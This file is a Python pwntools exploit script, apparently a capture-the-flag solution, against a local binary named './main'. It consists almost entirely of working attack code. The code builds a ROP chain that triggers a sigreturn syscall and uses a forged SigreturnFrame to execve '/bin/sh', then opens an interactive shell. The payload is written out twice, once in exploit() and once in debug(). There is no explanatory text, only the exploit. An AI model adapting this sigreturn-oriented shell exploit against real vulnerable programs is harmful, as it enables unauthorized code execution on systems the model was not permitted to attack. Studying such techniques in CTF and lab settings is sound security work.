#!/usr/bin/env python
# -=-<[ Bismillahirrahmanirrahim ]>-=-
# -*- coding: utf-8 -*-
# @Date    : 2022-09-23 00:09:10
# @Author  : Dahir Muhammad Dahir (dahirmuhammad3@gmail.com)
# @Link    : link
# @Version : 1.0.0


from pwn import *

context.arch = "amd64"

filename = "./main"
binary_target = ELF(filename)
target_process = process(filename)


def exploit():
    syscall_gadget = 0x0040102b
    bin_sh_address = 0x00402000
    execve_syscall = 0x3b

    initial_rop = ROP(binary_target)

    initial_rop.raw(cyclic(0x8)) # account for RBP
    initial_rop(rax=0xf)
    initial_rop.raw(syscall_gadget)

    execve_sigret_frame = SigreturnFrame()

    execve_sigret_frame.rip = syscall_gadget
    execve_sigret_frame.rax = execve_syscall
    execve_sigret_frame.rdi = bin_sh_address
    execve_sigret_frame.rsi = 0
    execve_sigret_frame.rdx = 0

    payload = flat(initial_rop.chain(), bytes(execve_sigret_frame))

    my_send(payload)
    
    target_process.interactive()



def debug():
    syscall_gadget = 0x0040102b
    bin_sh_address = 0x00402000
    execve_syscall = 0x3b

    initial_rop = ROP(binary_target)

    initial_rop.raw(cyclic(0x8)) # account for RBP
    initial_rop(rax=0xf)
    initial_rop.raw(syscall_gadget)

    execve_sigret_frame = SigreturnFrame()

    execve_sigret_frame.rip = syscall_gadget
    execve_sigret_frame.rax = execve_syscall
    execve_sigret_frame.rdi = bin_sh_address
    execve_sigret_frame.rsi = 0
    execve_sigret_frame.rdx = 0

    payload = flat(initial_rop.chain(), bytes(execve_sigret_frame))

    print("press enter to send payload")
    pause()

    my_send(payload)

    pause()
    target_process.interactive()


def my_send_line(data) -> None:
    target_process.sendline(data)


def my_send(data) -> None:
    target_process.send(data)


if __name__ == "__main__":
    # debug()
    exploit()
    # solve()


